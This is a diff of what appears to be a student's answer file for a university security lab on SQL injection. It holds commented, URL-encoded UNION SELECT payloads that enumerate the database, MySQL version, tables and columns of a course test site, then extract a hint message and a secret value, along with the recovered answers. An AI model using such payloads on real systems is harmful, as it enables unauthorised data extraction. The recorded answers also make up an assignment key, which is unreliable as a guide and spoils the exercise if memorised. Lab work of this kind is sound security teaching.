@@ -1,10 +1,22 @@
 proj2_inject3
 8.0.30-0ubuntu0.22.04.1
 HINT,SECRET,foo,inject3_users
-A_SECRET_STRING
+incus
 
+// Get the name of the database in use
 http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CDATABASE%28%29%3B+--+
+
+// Get the version of MySQL in use
 http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Cversion%28%29%3B+--+
+
+// Get the names of all tables in the current database
 http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CGROUP_CONCAT%28TABLE_NAME%29+FROM+information_schema.TABLES+WHERE+table_schema%3D%27proj2_inject3%27%3B+--+
-http://URL_FOR_PROBLEM_4
-http://ANOTHER_URL_FOR_PROBLEM_4
+
+// Get 'Column' in Table 'HINT'
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CGROUP_CONCAT%28column_name%29+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME%3D%27HINT%27%3B+--+
+// Get 'message' in Table 'HINT' with 'id'='1'
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Cmessage+FROM+HINT+WHERE+id%3D%271%27%3B+--+
+// Get 'Column' in Table 'SECRET'
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CGROUP_CONCAT%28column_name%29+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME%3D%27SECRET%27%3B+--+
+// Get 'secret' in Table 'SECRET' with 'hash='
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Csecret+FROM+SECRET+WHERE+hash%3D%273168622a73961f1d17b1a105be567177%27%3B+--+
